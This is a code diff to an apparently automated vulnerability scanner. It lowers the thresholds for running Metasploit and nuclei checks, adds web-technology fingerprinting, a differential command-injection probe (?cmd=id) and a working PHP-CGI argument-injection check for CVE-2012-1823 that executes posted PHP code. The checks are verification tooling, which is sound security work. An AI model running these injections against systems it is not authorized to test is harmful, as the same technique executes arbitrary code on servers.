@@ -959,6 +959,15 @@ class ConfidenceEngine:
                 score += 5
                 reasons.append("Version inside vulnerable range")
 
+        # 6. Эскалация: высокий EPSS/KEV при подтверждённом продукте —
+        # не скипаем, а отдаём на безопасную проверку (msf check / nuclei),
+        # даже если версия неизвестна (сервер её скрывает).
+        product_matched_source = exploit_source in ("vulners", "nmap_vulners", "metasploit", "searchsploit")
+        if (is_kev or epss >= 0.9) and product_matched_source and score < 55:
+            score = 55
+            reasons.append(f"Escalated to run_check: {'KEV' if is_kev else f'EPSS {epss:.2f}'} "
+                           f"+ product confirmed, version unknown")
+
         score = min(100, max(0, score))
 
         if score >= 90:
@@ -1234,6 +1243,29 @@ class TechDetector:
             return "Unknown"
         except Exception as e:
             log_error(f"[WhatWeb] err: {e}")
+            return self._detect_by_headers(url)
+
+    def _detect_by_headers(self, url):
+        """Fallback, когда whatweb недоступен/таймаутит: снимок по заголовкам."""
+        try:
+            sess = requests.Session()
+            sess.verify = False
+            r = sess.get(url, timeout=10, allow_redirects=True,
+                         headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"})
+            hints = []
+            for h in ["Server", "X-Powered-By", "X-Generator", "X-AspNet-Version"]:
+                v = r.headers.get(h)
+                if v:
+                    hints.append(f"{h}: {v}")
+            cookies = " ".join(r.headers.get("Set-Cookie", "").lower() for _ in [0])
+            if "phpsessid" in cookies: hints.append("PHP (PHPSESSID)")
+            if "jsessionid" in cookies: hints.append("Java (JSESSIONID)")
+            if "asp.net" in cookies or "aspnetsession" in cookies: hints.append("ASP.NET")
+            result = "; ".join(hints) if hints else "Unknown"
+            log_info(f"[Tech] header fingerprint {url}: {result[:120]}")
+            return result
+        except Exception as e:
+            return f"Error: {e}"
             return f"Error: {e}"
 
 
@@ -2220,7 +2252,8 @@ class PoCVerifier:
         port = context.get("port") if context else None
         host = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
         conf = context.get("confidence", {}) if isinstance(context, dict) else {}
-        if self._msf_available and conf.get("score", 0) >= 70:
+        # 55 = run_check (после эскалации EPSS/KEV) — msf search кэшируется по CVE
+        if self._msf_available and conf.get("score", 0) >= 55:
             msf_modules = self._search_metasploit_by_cve(cve)
             if msf_modules:
                 log_info(f"[PoC] MSF found {len(msf_modules)} modules for {cve} (conf={conf.get('score')})")
@@ -2233,9 +2266,9 @@ class PoCVerifier:
         web_result = self._check_cve_by_id(url, cve, context)
         if web_result:
             web_result["label"] = label; results.append(web_result)
-        # Fallback: нет встроенного check и метаплоты не дали результата —
-        # пробуем nuclei-шаблон этого CVE (покрытие: тысячи CVE).
-        if conf.get("score", 0) >= 50 and not web_result and not results:
+        # Fallback: встроенного check нет (или он unknown) и метаплоты
+        # не дали результата — пробуем nuclei-шаблон этого CVE.
+        if conf.get("score", 0) >= 40 and (not web_result or web_result.get("status") == "unknown") and not results:
             nuclei_res = self._nuclei.check_cve(url, cve)
             if nuclei_res:
                 nuclei_res["label"] = label
@@ -2473,6 +2506,7 @@ class PoCVerifier:
             "cve-2019-7238": self.check_nexus_cve_2019_7238,
             "cve-2021-22205": self.check_gitlab_cve_2021_22205,
             "cve-2021-43798": self.check_grafana_cve_2021_43798,
+            "cve-2012-1823": self.check_php_cgi_cve_2012_1823,
         }
         if cve_lower in checks:
             return checks[cve_lower](url, context)
@@ -2866,16 +2900,47 @@ class PoCVerifier:
         return None
 
     def check_rce(self, url):
-        test_urls = [f"{url}?cmd=id", f"{url}?exec=whoami"]
-        for test_url in test_urls:
+        # Дифференциальная проверка: маркер должен появиться ТОЛЬКО с payload,
+        # и это должен быть реальный вывод команды (uid=1000(x) gid=…),
+        # а не слово "root" в обычной странице.
+        baseline, _ = self._safe_request("get", url)
+        baseline_text = (baseline.text or "") if baseline is not None else ""
+        id_re = re.compile(r"uid=\d+\([a-z_][\w]*\)\s+gid=\d+\([a-z_][\w]*\)")
+        whoami_re = re.compile(r"^[\w.-]*(www-data|apache2?|nginx|daemon|nobody)[\w.-]*$", re.MULTILINE)
+        for param, payload, marker_re, marker_desc in [
+            ("cmd", "id", id_re, "uid/gid output"),
+            ("exec", "whoami", whoami_re, "whoami output"),
+        ]:
+            test_url = f"{url}?{param}={payload}"
             r, err = self._safe_request("get", test_url)
             if err and "blocked" in err:
                 return {"target": url, "vulnerability": "RCE", "type": "generic", "status": "blocked",
                     "details": f"WAF blocked ({err})", "method": "rce_test", "timestamp": datetime.now().isoformat()}
-            if r and any(x in r.text for x in ["uid=", "gid=", "root", "www-data"]):
+            if r is not None and marker_re.search(r.text) and not marker_re.search(baseline_text):
                 return {"target": url, "vulnerability": "RCE", "type": "generic", "status": "vulnerable",
-                    "details": f"Command output detected", "method": "rce_test", "timestamp": datetime.now().isoformat()}
+                    "details": f"Command output detected ({marker_desc}), differential vs baseline",
+                    "method": "rce_test", "timestamp": datetime.now().isoformat()}
         return None
+
+    def check_php_cgi_cve_2012_1823(self, url, context=None):
+        # Классический PHP-CGI argument injection: автопрепенд php://input.
+        # Маркер подтверждает выполнение, а не просто отражение запроса.
+        marker = hashlib.md5(str(random.random()).encode()).hexdigest()
+        payload = f"<?php echo '{marker}'; ?>"
+        check_url = url.rstrip("/") + "/?-d+allow_url_include%3D1+-d+auto_prepend_file%3Dphp://input"
+        r, err = self._safe_request("post", check_url, data=payload,
+                                    headers={"Content-Type": "application/octet-stream"})
+        if err and "blocked" in err:
+            return {"target": url, "vulnerability": "CVE-2012-1823", "type": "cve", "status": "blocked",
+                "details": f"WAF blocked ({err})", "method": "php_cgi_injection",
+                "timestamp": datetime.now().isoformat()}
+        if r and marker in r.text:
+            return {"target": url, "vulnerability": "CVE-2012-1823", "type": "cve", "status": "vulnerable",
+                "details": "PHP code executed via CGI argument injection (marker echoed)",
+                "method": "php_cgi_injection", "timestamp": datetime.now().isoformat()}
+        return {"target": url, "vulnerability": "CVE-2012-1823", "type": "cve", "status": "not_vulnerable",
+                "details": f"Response: {r.status_code if r is not None else 'error'}",
+                "method": "php_cgi_injection", "timestamp": datetime.now().isoformat()}
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # MAIN
